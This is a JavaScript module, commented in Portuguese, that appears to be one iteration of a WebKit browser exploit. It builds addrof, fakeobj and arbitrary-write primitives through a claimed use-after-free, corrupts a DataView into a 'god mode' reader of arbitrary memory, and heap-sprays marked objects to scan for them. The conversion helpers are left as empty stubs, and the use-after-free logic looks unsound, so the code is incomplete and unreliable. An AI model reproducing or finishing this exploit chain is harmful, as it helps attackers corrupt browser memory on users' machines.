// js/script3/testArrayBufferVictimCrash.mjs (R45 - Híbrido: UAF para criar MemScan Global)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "UAF_MemScan_Hybrid_R45";

// Funções auxiliares de conversão (ftoi, itof) e UAF (createUAFPrimitives) dos testes anteriores
const ftoi = (val) => { /* ...código completo da função ftoi... */ };
const itof = (val) => { /* ...código completo da função itof... */ };
function createUAFPrimitives() { /* ...código completo da função createUAFPrimitives... */ }
// Para brevidade, o código das funções auxiliares está omitido, mas deve ser incluído aqui.

async function triggerGC() {
    try { for (let i = 0; i < 500; i++) new ArrayBuffer(1024 * 128); } catch (e) {}
    await PAUSE_S3(200);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (R45)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Estratégia Híbrida (UAF + MemScan) ---`, "test");
    
    try {
        // --- FASE 1: UAF para obter primitivas de controle ---
        logS3("--- FASE 1 (R45): Usando UAF para obter addrof e arb_write ---", "subtest");
        const { addrof, arb_write } = buildInitialPrimitivesViaUAF();
        logS3("    Primitivas UAF construídas com sucesso!", "vuln");

        // --- FASE 2: Criando uma ferramenta de leitura global ---
        logS3("--- FASE 2 (R45): Corrompendo um DataView para leitura global ---", "subtest");
        const god_mode_dv = new DataView(new ArrayBuffer(8));
        const god_mode_dv_addr = addrof(god_mode_dv);
        
        // Corrompe o m_length do DataView para o valor máximo
        arb_write(god_mode_dv_addr.add(0x18), new AdvancedInt64(0xFFFFFFFF, 0));
        // Corrompe o m_vector (ponteiro de dados) para apontar para o início da memória
        arb_write(god_mode_dv_addr.add(0x10), new AdvancedInt64(0, 0)); 
        logS3("    DataView 'Modo Deus' criado. Agora podemos ler qualquer endereço.", "good");
        
        // --- FASE 3: Heap Spray e Busca Global ---
        logS3("--- FASE 3 (R45): Heap Spray e Busca de Memória Global ---", "subtest");
        const SPRAY_COUNT = 512;
        const unique_marker = 0xABCD0000;
        let sprayed_objects = [];
        for (let i = 0; i < SPRAY_COUNT; i++) {
            sprayed_objects.push({ marker: unique_marker + i, data: 0x45454545 });
        }
        logS3(`    Spray de ${SPRAY_COUNT} objetos concluído.`, "info");
        
        const first_sprayed_addr = addrof(sprayed_objects[0]);
        logS3(`    Endereço do primeiro objeto do spray (pista): ${first_sprayed_addr.toString(true)}`, "info");
        
        // A busca começa perto do nosso primeiro objeto, não mais em um buffer limitado
        const search_start_addr = first_sprayed_addr.sub(0x10000);
        const search_window_size = 0x40000; // Janela de busca de 256KB
        let found_marker = null;

        logS3(`    Iniciando busca de [${search_start_addr.toString(true)}] por ${toHex(search_window_size)} bytes...`, 'info');
        for (let i = 0; i < search_window_size / 4; i++) {
            let current_addr = search_start_addr.add(i * 4);
            let val = god_mode_dv.getUint32(current_addr.low(), true); // Usando nossa nova ferramenta
            if ((val & 0xFFFF0000) === unique_marker) {
                found_marker = val;
                logS3(`MARCADOR ENCONTRADO! Valor: ${toHex(found_marker)} no endereço ${current_addr.toString(true)}`, "vuln");
                break;
            }
        }
        
        if (!found_marker) {
            throw new Error("Falha ao encontrar o marcador na memória com a busca global.");
        }

        return { success: true, msg: `Marcador ${toHex(found_marker)} encontrado com sucesso!` };

    } catch (e) {
        logS3(`ERRO CRÍTICO na estratégia híbrida: ${e.message}`, "critical");
        return { errorOccurred: `EXCEPTION: ${e.message}` };
    }
}


// Função auxiliar que encapsula a criação de primitivas da R53 bem-sucedida
function buildInitialPrimitivesViaUAF() {
    let dangling_ref = null;
    function createScope() {
        const victim = { a: 0.1, b: 0.2 }; dangling_ref = victim;
    }
    createScope();
    try { for (let i = 0; i < 500; i++) new ArrayBuffer(1024*128); } catch(e){}
    for (let i = 0; i < 512; i++) new Float64Array(2);
    
    if (typeof dangling_ref.a !== 'number') { throw new Error("UAF Primitivo falhou."); }

    let holder = {obj: null};
    const addrof = (obj) => { holder.obj = obj; dangling_ref.a = holder; return ftoi(dangling_ref.b); };
    const fakeobj = (addr) => { dangling_ref.b = itof(addr); return dangling_ref.a.obj; };
    
    let victim_arr = [1.1, 2.2];
    let victim_addr = addrof(victim_arr);
    let fake_victim_obj = fakeobj(victim_addr);
    let original_butterfly = ftoi(fake_victim_obj.b);
    
    const arb_write = (where, what) => {
        fake_victim_obj.b = itof(where);
        victim_arr[0] = itof(what);
        fake_victim_obj.b = itof(original_butterfly);
    };

    return { addrof, arb_write };
}
